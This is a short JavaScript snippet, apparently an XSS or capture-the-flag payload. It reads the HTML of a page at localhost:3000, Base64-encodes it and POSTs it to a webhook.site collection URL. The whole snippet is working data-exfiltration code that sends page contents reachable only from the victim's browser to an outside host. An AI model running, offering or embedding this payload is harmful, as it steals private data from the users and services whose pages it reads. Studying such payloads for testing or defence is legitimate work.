fetch('https://localhost:3000/')
  .then(response => response.text())
  .then(html => {
    // Encode the HTML response in Base64
    const base64Encoded = btoa(unescape(encodeURIComponent(html)));
    
    // Send the encoded HTML to the webhook
    return fetch('https://webhook.site/e884e5ed-6253-41b6-8a52-f4868457bd7a', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ data: base64Encoded })
    });
  })
  .then(response => console.log('Data sent successfully'))
  .catch(error => console.error('Error:', error));
